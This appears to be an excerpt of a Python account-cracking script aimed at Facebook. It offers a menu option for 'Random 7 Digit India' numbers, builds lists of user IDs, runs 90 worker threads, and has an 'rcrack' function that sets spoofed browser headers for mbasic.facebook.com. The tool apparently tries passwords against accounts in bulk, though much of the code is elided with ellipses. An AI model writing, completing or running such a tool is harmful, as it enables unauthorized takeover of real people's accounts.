...
def Main():
    ...
    print(' \033[1;33m [02] Random 7 Digit India ')
    print(50*'_')
    ssinp = input(' [★] Choice : ')
    if ssinp in ['1','01']:
        ind()
...
def bd():
    ...
    for nmbr in range(limt):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=90) as HKR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(50*'_')
...
def rcrack(uid,pwx,tl):
    ...
    'authority': f'mbasic.facebook.com',
           ...
           'x-requested-with': 'mbasic.facebook.com',
           'x-xss-protection': '0',
           'sec-ch-ua': '" Not A;Brand";v="100", "Microsoft Edge";v="101", "Chromium";v="100.01.0.72"',
           'sec-ch-ua-mobile': '?0'
            }
